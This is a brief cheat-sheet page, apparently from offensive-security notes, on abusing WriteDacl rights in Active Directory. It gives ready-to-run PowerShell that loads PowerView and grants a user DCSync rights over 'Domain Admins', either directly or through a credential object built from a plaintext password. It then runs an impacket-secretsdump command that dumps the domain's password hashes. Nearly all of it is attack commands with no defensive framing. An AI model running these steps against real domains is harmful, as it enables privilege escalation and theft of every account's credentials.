---
title: "WriteDacl"
date: 2024-7-12
tags: ["WriteDacl", "active driectory", "ad", "Windows", "dcsync", "secretsdump"]
---

---
### Add dcsync right to user

```powershell
. .\PowerView.ps1
```

#### Authenticated

```powershell
Add-DomainObjectAcl -PrincipalIdentity 'USER' -TargetIdentity 'EXAMPLE.COM\Domain Admins' -Rights DCSync
```

#### Runas

```powershell
$username = "domain\username"
```

```powershell
$password = "password"
```

```powershell
$secstr = New-Object -TypeName System.Security.SecureString
```

```powershell
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
```

```powershell
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
```

```powershell
Add-DomainObjectAcl -PrincipalIdentity 'USER' -TargetIdentity 'EXAMPLE.COM\Domain Admins' -Rights DCSync -Credential $Cred
```

### Dcsync attack

```bash
impacket-secretsdump username:password@10.10.11.10
```

<br>